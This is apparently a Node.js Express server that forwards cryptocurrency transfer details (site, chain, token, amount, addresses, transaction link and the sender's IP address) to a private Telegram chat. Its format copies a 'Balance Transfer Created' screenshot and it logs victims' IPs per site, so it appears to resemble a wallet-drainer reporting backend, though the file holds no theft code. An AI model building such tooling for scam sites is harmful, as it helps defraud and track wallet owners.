import express from 'express'
import cors from 'cors'
import fetch from 'node-fetch'

const app = express()
app.use(express.json())

const ALLOWED_ORIGIN = process.env.ALLOWED_ORIGIN

app.use(cors({
  origin: (origin, cb) => {
    if (!ALLOWED_ORIGIN) return cb(null, true)
    return cb(null, origin === ALLOWED_ORIGIN)
  },
  methods: ['POST','GET'],
  allowedHeaders: ['Content-Type']
}))

app.get('/health', (_, res) => res.send('ok'))

function networkExplorer(chain = '') {
  const c = chain.toLowerCase()
  if (c.includes('arbitrum')) return 'arbiscan.io'
  if (c.includes('polygon') || c.includes('matic')) return 'polygonscan.com'
  if (c.includes('bsc') || c.includes('binance')) return 'bscscan.com'
  if (c.includes('base')) return 'basescan.org'
  if (c.includes('optimism') || c.includes('op')) return 'optimistic.etherscan.io'
  if (c.includes('sol')) return 'solscan.io'
  return 'etherscan.io'
}

function txUrl(chain, tx) {
  const host = networkExplorer(chain)
  if (host === 'solscan.io') return `https://${host}/tx/${tx}`
  return `https://${host}/tx/${tx}`
}

function short(addr = '') {
  if (!addr) return ''
  return addr.length <= 10 ? addr : `${addr.slice(0, 6)}...${addr.slice(-6)}`
}

function buildTelegramText({ chain, token, amount, from, to, tx, site, ip }) {
  const lines = []
  // Title line like the screenshot
  lines.push('✅ Balance Transfer Created' + (amount ? ` - ${amount}` : ''))

  // Address label
  lines.push('📜 Address NFTs') // Text label from screenshot

  // Explorer line
  if (tx) {
    const url = txUrl(chain || '', tx)
    lines.push(url)
  }

  // From address line
  if (from) lines.push(short(from))

  // Optional extra context
  if (site) lines.push(`🌐 Site: ${site}`)
  if (ip) lines.push(`📍 IP: ${ip}`)

  return lines.join('\n')
}

function explorerLink({ chain, tx }) {
  if (!tx) return ''
  if ((chain||'').toLowerCase().includes('sol')) {
    return `https://solscan.io/tx/${tx}`
  }
  return `https://etherscan.io/tx/${tx}`
}

app.post('/notify', async (req, res) => {
  try {
    const { kind, chain, from, to, token, amount, tx, site } = req.body || {}
    if (!tx || !from) return res.status(400).json({ error: 'missing tx/from' })

    const bot = process.env.TELEGRAM_BOT_TOKEN
    const chat = process.env.TELEGRAM_CHAT_ID
    if (!bot || !chat) return res.status(500).json({ error: 'bot not configured' })

    const fwd = (req.headers['x-forwarded-for'] || '').toString()
    const ip = fwd.split(',')[0].trim() || req.ip || ''

    const lines = [
      token === 'SOL' || (token === 'USDT' && (chain||'').includes('sol')) ? '🟣 *Solana Deposit*' : '🟠 *Ethereum Deposit*',
      site ? `🌐 Site: ${site}` : null,
      chain ? `🔗 Chain: ${chain}` : null,
      token ? `💰 Token: ${token}${amount ? ` (${amount})` : ''}` : null,
      `👤 From: \`${from}\``,
      to ? `🎯 To: \`${to}\`` : null,
      tx ? `🧾 Tx: ${tx}` : null,
      tx ? `🔎 Explorer: ${explorerLink({ chain, tx })}` : null,
      ip ? `📍 IP: ${ip}` : null
    ].filter(Boolean)

    const text = lines.join('\n')

    const url = `https://api.telegram.org/bot${bot}/sendMessage`
    const resp = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ chat_id: chat, text, parse_mode: 'Markdown' })
    })
    if (!resp.ok) throw new Error(`telegram ${resp.status}`)
    res.json({ ok: true })
  } catch (e) {
    res.status(500).json({ error: String(e) })
  }
})

const PORT = process.env.PORT || 3000
app.listen(PORT, () => console.log('notify server on', PORT))
